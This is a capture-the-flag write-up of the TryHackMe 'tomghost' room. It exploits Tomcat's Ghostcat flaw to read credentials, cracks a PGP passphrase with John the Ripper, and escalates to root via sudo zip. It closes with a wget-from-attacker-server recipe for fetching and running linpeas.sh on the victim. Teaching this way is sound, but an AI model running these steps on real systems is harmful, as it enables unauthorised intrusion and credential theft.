# ***tomghost***
![alt text](https://i.imgur.com/OyETyLA.png "Tomghost logo")

*Plateform* - [**TryHackMe**](https://tryhackme.com/room/tomghost)

*Rating* - **Easy**

## **Step 1 : SCANNING AND ENUMERATION** 

### *Nmap Output*  

Our nmap scan was the following: `nmap -A -T4 -p- -v -oN tomghost_full 10.10.185.102`

#### *nmap results*

![alt text](https://i.imgur.com/JaQLTK6.png "nmap results")

What seems the most interesting is the combination of **ports 8009 and 8080**.

### *Port 8080 -- Tomcat webserver*

Traveling to http://tomghost.thm:8080/, we notice webserver is running Apache Tomcat/9.0.30. This is an information that will come in handy later to validate our exploit. Furthermore, we notice that the manager app gives us a 403 - Forbidden, indicating this is not the way in.

### *Port 8009 -- Apache Jserv*

If we google `Apache Jserv (Protocol v1.3) exploit`, we will find the **CVE-2020-1938**[https://nvd.nist.gov/vuln/detail/CVE-2020-1938].

>When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to **9.0.0.30**, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. [[Source]](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)

From reading this, we learn that our webserver version is most likely vulnerable to this exploit.

After digging a little, we find the exploit-db page for the [*Ghostcat File Read/Inclusion exploit*](https://www.exploit-db.com/exploits/48143) and more information pertaining to GhostCat:

>What is Ghostcat [CVE-2020–1938] vulnerability?
This is an LFI vulnerability in AJP service. An attacker can exploit Ghostcat vulnerability and read the contents of configuration files and source code files of all webapps deployed on Tomcat.
For example, the **/WEB-INF/web.xml** file is the Web Root directory who’s access is restricted and cannot be accessed by anyone over HTTP Tomcat server. [[Source]](https://medium.com/@prem2/ghostcat-vulnerability-cve-2020-1938-ajp-lfi-apache-tomcat-server-vulnerability-9f57330e3eb1)

### *Port 22 -- SSH*

While it is nice to know SSH is enabled, this isn't usually a way in.

## **Step 2 : EXPLOITATION**

### *Getting information using GhostCat*

Let's run the ghostcat script found at step 2:

![alt text](https://i.imgur.com/TIEvmi3.png "Script results")

From reading the `web.xml` file, we found potential credentials : `skyfuck:8730281lkjlkjdqlksalks`

### *Exploiting the newly found credentials to find a way in*

Remember that ssh port? Yeah, let's try putting these credentials in.

![alt text](https://i.imgur.com/jPDO4at.png "We are in!")

BINGO! We are in as user *Skyfuck*.

## **Step 3 : POST-EXPLOITATION**

### *Enumerating the Skyfuck user*

![alt text](https://i.imgur.com/Psr2iyT.png "")

Now, there are a few things I want to point out on this screenshot. First off, we are in as a low privileged user, Skyfuck. Regardless of his dubious choice of username, he is very helpful to us and keeps important files on his home directory : `credential.pgp` and `tryhackme.asc`.

While I could waste a bit of time showing you the results of the enumeration for Skyfuck, the real way in is the one described above.

#### Attempt 1 : Reading the credential.pgp file

The `tryhackme.asc` file is a PGP private key and we can assume it is the key to decrypt the `credential.pgp` file.

Let's try!

![alt text](https://i.imgur.com/dG5INEH.png "Can't read!")

Sadly, we need a passphrase and an empty string did not work. No problem, let's work on cracking it!

#### Cracking the tryhackme.asc passphrase

First off, copy the content of the file to your attacker vm. Name this file however you like. I used a very original name for mine: `crackme.asc`.

Next, we'll use JohnTheRipper to crack it.

1. Let's make our file in a format JTR can read: `gpg2john crackme.asc > crackme.hash`

2. Next, we can crack it! I used the `rockyou.txt` wordlist as my dictionary: `john --wordlist=/usr/share/wordlists/rockyou.txt crackme.hash`

Since I've already cracked it before, I won't get anything from the first command, but left it in for the write-up.

![alt text](https://i.imgur.com/nCV6yeE.png "Cracked passphrase!")

There we go! We have the passphrase: `alexandru`

#### Attempt 2 : Reading the credential.pgp file

We can now enter the passphrase and read the `credential.pgp` file.

![alt text](https://i.imgur.com/OamDYkS.png "Merlin credentials")

We find the merlin credentials! `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

### *Enumerating the merlin user*

First off, we notice merlin has the `user.txt` flag inside his home directory.

![alt text](https://i.imgur.com/lhulHWp.png "user.txt")

In order to get an idea of how to privesc, I will use the [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script, by carlospolop.

> NOTE: There are a few ways to put the `linpeas.sh` script on the victim machine. I chose the `wget` way. If you are stuck here, I've written a walkthrough at the bottom of the write-up.

Of course, I can't show the whole output as it would be too long, so let's focus on the important bit:

![alt text](https://i.imgur.com/At2Qf0v.png "Privesc way?")

Interesting! We see we can sudo the `zip` binary. Using [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo), we see a find to privesc.

![alt text](https://i.imgur.com/xzirOD4.png "Rooted!")

**PWNED! We rooted the machine and found the root flag!**

## **SUMMARY**

All in all, this was an easy room but full of very nice elements! My main takeaways from this room are the following: ghostcat, pgp encryption (and decryption), and privesc via a sudo'able binary. 

As promised, the walkthrough for the linpeas.sh script.

> Attacker machine

1. Get [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script and put it in a file named `linpeas.sh`
2. Set up a python server: `python -m SimpleHTTPServer 80`

> Victim machine

1. `wget http://*Your-tun0-ip*/linpeas.sh`    # Download the script from your python http server
2. `chmod +x linpeas.sh`                      # Make it executable
3. `./linpeas.sh`                             # Run it!

> End of tutorial :) This is a very useful tool to keep in your back pocket as you will use it over and over again!

# **Thank you for reading this write-up!**
